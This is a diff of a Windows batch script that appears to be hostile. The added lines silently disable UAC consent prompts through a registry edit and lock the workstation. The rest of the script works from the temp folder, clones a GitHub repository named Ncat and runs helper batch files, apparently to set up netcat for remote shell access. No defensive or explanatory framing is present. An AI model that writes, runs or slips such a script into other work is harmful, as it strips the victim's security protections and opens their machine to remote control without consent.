@@ -33,6 +33,10 @@
 ::978f952a14a936cc963da21a135fa983
 cd %TEMP%
 
+powershell.exe -Command "Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0"
+
+powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
+
 @echo off
 
 set repo_url=https://github.com/skydrige/Ncat.git
@@ -52,8 +56,6 @@ powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
 py_311.bat
 
 echo %CD%
-
-powershell.exe -Command "Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0"
 
 Nc.bat
 
